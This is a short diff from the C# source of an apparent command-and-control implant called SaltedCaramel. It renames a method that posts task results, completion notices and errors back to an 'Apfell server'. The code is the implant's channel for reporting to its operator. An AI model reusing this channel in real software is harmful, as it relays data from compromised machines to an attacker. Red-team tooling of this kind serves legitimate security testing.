@@ -68,7 +68,7 @@ namespace SaltedCaramel
         /// </summary>
         /// <param name="taskresp">The response to post to the endpoint</param>
         /// <returns>String with the Apfell server's reply</returns>
-        public string SCPostResp(SCTaskResp taskresp)
+        public string PostResponse(SCTaskResp taskresp)
         {
             string endpoint = this.endpoint + "responses/" + taskresp.id;
             try // Try block for HTTP requests
@@ -88,7 +88,7 @@ namespace SaltedCaramel
                     {
                         Debug.WriteLine($"[!] PostResponse - ERROR: Unable to post task response for {taskresp.id}, retrying...");
                         Thread.Sleep(this.sleep);
-                        this.SCPostResp(taskresp);
+                        this.PostResponse(taskresp);
                     }
                     retry++;
                     throw (new Exception("[!] PostResponse - ERROR: Retries exceeded"));
@@ -105,14 +105,14 @@ namespace SaltedCaramel
         {
             Debug.WriteLine($"[+] SendComplete - Sending task complete for {taskId}");
             SCTaskResp completeResponse = new SCTaskResp("{\"completed\": true}", taskId);
-            this.SCPostResp(completeResponse);
+            this.PostResponse(completeResponse);
         }
 
         public void SendError(string taskId, string error)
         {
             Debug.WriteLine($"[+] SendError - Sending error for {taskId}: {error}");
             SCTaskResp errorResponse = new SCTaskResp("{\"completed\": true, \"status\": \"error\", \"user_output\": \"" + error + "\"}", taskId);
-            this.SCPostResp(errorResponse);
+            this.PostResponse(errorResponse);
         }
 
         /// <summary>
